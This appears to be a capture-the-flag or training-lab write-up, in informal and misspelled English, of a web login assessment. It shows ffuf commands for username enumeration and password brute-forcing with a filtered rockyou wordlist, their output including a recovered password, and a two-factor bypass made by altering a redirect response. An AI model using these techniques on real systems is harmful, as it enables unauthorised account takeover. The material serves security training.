# Skills Assessment

* Obtain the flag.

We can see a login panel and a option of create account -->

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

I try to create a account with the usename admin and with his passwords policy -->

admin : Ad3456789012

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

BUT! I have the name admin but not the privileges of admin ... this means that the admin user did not exist

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

okay, se that, eneumate users by error -->

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

If i set bad the password of us user (in this casea admin), get a error, do ffuf -->

```
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.249.246:33824/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username or password." -s
--------------
Admin
admin
gladys
user1
```

AHA! gladys! DO BRUTE FORCE! Before that, maybe we should be shot the rockyou and the ffuz -->

```
grep '[[:digit:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:upper:]]' | grep '[[:alnum:]]' | grep '^.\{12\}$' > custom_wordlist.txt
##
ffuf -w ./custom_wordlist.txt -u http://83.136.249.246:33824/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials."
---
dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
```

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

OPAA! 2FA, np if i intercept it with burp i can see the parameter and it i can use intruto to do brute force:

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

BUTT! i see the rate limit of the app. After 3 unsuccessful tries, the page redirects back to the `login.php`&#x20;

<figure><img src="../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

After intercept again the login peticion, i can see that the web, after i loging and otorgate the cookie, he response redirect me to `/2fa.php`, me question is... can i redirect me to `profile.php` direct and bypass the 2fa ??? -->

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Apparently IT FOUND... but he get us 302 found... maybe change to 200 OK -->

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

HAHAHA NICE
